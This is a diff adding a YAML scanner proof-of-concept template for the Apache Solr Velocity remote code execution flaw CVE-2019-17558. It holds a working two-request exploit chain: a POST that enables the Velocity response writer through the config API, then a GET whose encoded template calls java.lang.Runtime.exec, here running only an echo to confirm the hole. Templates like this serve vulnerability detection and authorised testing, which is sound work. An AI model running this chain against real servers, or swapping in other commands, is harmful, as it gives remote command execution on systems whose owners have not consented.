@@ -1,0 +1,23 @@
+name: poc-solr-velocity
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+  r1: randomLowercase(6)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/solr/{{r1}}/config"
+      body: '{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}'
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: "/solr/{{r1}}/select?q=1&wt=velocity&v.template=custom&v.template.custom=%23set($x%3d{{r0}})%23set($rt%3d$x.class.forName(%22java.lang.Runtime%22))%23set($inst%3d$rt.getRuntime())$inst.exec(%22echo%20{{r0}}%22)"
+    expression: response.status == 200 && response.body.bcontains("{{r0}}")
+expression: r0() && r1()
+detail:
+  author: sxel
+  description: Apache Solr Velocity template RCE (CVE-2019-17558, velocity response writer enable + template exec)
+  severity: critical
+  tags: solr,apache,java,rce,velocity
